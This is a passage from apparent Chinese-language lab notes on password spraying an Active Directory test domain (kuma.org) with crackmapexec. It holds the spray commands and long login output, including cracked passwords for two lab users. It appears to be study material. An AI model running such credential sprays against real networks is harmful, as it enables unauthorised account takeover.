192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\krbtgt:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\laurena.mirelle:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lazaro.karoly:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lilas.lindy:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lily.kristofor:r2NE4/9:F;[k STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [+] kuma.org\\lina.allene:r2NE4/9:F;[k 的確是lina.allene的密碼 ::: :::spoiler Result of Fara\n$ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p 8F%kJ2q_cVFg SMB 192.168.222.128 445 WIN-818G5VCOLJO [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True) SMB 192.168.222.129 445 DESKTOP-G95U93T [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False) SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\Administrator:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\aleda.appolonia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\alikee.perri:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\aloise.elfrida:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\amabelle.gayle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\andree.suki:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\angelique.hilda:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\annice.eden:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\anya.gypsy:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\audi.rosalind:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\babb.joanne:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bambi.etta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bear:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berget.celka:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berna.raphaela:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berny.kirby:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bill.marylee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\caitrin.latia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carey.kincaid:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carlye.chloette:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carmelle.libbi:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\casandra.cherrita:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\casi.hyacinth:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\cassondra.lothario:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\celeste.kelci:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\charis.kory:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\christi.nettle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\coraline.mahalia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\corine.celesta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\cyndie.rhodie:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\daile.odetta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\darlleen.dorisa:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\DefaultAccount:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dollie.fayina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dominica.carmon:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dorrie.paolina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\eba.luca:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ella.randee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\erena.elinore:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [+] kuma.org\\fara.iseabal:8F%kJ2q_cVFg SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\Administrator:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\aleda.appolonia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\alikee.perri:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\aloise.elfrida:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\amabelle.gayle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\andree.suki:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\angelique.hilda:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\annice.eden:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\anya.gypsy:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\audi.rosalind:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\babb.joanne:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bambi.etta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bear:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berget.celka:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berna.raphaela:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berny.kirby:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bill.marylee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\caitrin.latia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carey.kincaid:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carlye.chloette:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carmelle.libbi:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\casandra.cherrita:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\casi.hyacinth:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\cassondra.lothario:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\celeste.kelci:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\charis.kory:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\christi.nettle:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\coraline.mahalia:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\corine.celesta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\cyndie.rhodie:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\daile.odetta:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\darlleen.dorisa:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\DefaultAccount:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dollie.fayina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dominica.carmon:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\dorrie.paolina:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\eba.luca:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\ella.randee:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\erena.elinore:8F%kJ2q_cVFg STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [+] kuma.org\\fara.iseabal:8F%kJ2q_cVFg 的確是fara.iseabal的密碼 :::\n先利用win2016查詢$ net user然後把結果存成一個file，然後-u後面帶這個file :::spoiler Result of Change123!\n$ crackmapexec smb 192.168.222.128/24 -u ./AD-user.txt -p Changeme123\\! SMB 192.168.222.129 445 DESKTOP-G95U93T [*] Windows 10.0 Build 18362 x64 (name:DESKTOP-G95U93T) (domain:kuma.org) (signing:False) (SMBv1:False) SMB 192.168.222.128 445 WIN-818G5VCOLJO [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-818G5VCOLJO) (domain:kuma.org) (signing:True) (SMBv1:True) SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\Administrator:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\aleda.appolonia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\alikee.perri:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\aloise.elfrida:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\amabelle.gayle:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\andree.suki:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\angelique.hilda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\annice.eden:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\anya.gypsy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\audi.rosalind:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\babb.joanne:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bambi.etta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bear:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berget.celka:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berna.raphaela:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\berny.kirby:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\bill.marylee:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\caitrin.latia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carey.kincaid:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carlye.chloette:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\carmelle.libbi:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\casandra.cherrita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\casi.hyacinth:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\cassondra.lothario:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\celeste.kelci:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\charis.kory:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\christi.nettle:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\coraline.mahalia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\corine.celesta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\cyndie.rhodie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\daile.odetta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\darlleen.dorisa:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\DefaultAccount:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dollie.fayina:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dominica.carmon:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\dorrie.paolina:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\eba.luca:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ella.randee:Changeme123! STATUS_PASSWORD_MUST_CHANGE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\erena.elinore:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\fara.iseabal:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\fred.carmita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\gabriel.diannne:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\garnet.constancia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\gertrude.felecia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\gillian.marsiella:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\giulietta.moyra:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\glenda.dorrie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\Guest:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\henrieta.sabine:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\herminia.debby:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\issy.eudora:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\jerrie.morganne:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\jessa.corinna:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\jori.floria:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\joyann.sibella:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\kaja.brenda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\karoly.nadeen:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\katee.annemarie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\katharina.alyssa:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\kiri.kath:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\kizzee.margaux:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\krbtgt:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\laurena.mirelle:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lazaro.karoly:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lilas.lindy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lily.kristofor:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lina.allene:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\linda.neda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\logan.janeen:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lon.sonni:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lorne.celie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\lucilia.lelah:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\margo.sharl:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\marlyn.loralee:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\marney.ranee:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\martita.juanita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\marylynne.susannah:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\maurizia.ines:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\mercy.edi:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\moyra.fanechka:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\nolana.rivy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ollie.dorita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\orelee.peri:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ortensia.fancy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\philippa.eugenie:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\philis.gilli:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\pietra.fern:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\randene.lelah:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ranee.delinda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\reina.claire:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\renae.babette:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\reyna.gwendolyn:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ricca.stefa:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ronni.kristoforo:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\rosetta.lotta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ruthann.britta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\ruthie.ebony:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\seana.jeanette:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\selestina.cassi:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\shantee.marylin:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\sherri.jacquetta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\sile.rhiamon:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\sofie.darlleen:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\star.rikki:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.129 445 DESKTOP-G95U93T [-] kuma.org\\stormie.natala:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\Administrator:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\aleda.appolonia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\alikee.perri:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\aloise.elfrida:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\amabelle.gayle:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\andree.suki:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\angelique.hilda:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\annice.eden:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\anya.gypsy:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\audi.rosalind:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\babb.joanne:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bambi.etta:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bear:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berget.celka:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berna.raphaela:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\berny.kirby:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\bill.marylee:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\caitrin.latia:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carey.kincaid:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carlye.chloette:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\carmelle.libbi:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] kuma.org\\casandra.cherrita:Changeme123! STATUS_LOGON_FAILURE SMB 192.168.222.128 445 WIN-818G5VCOLJO [-] 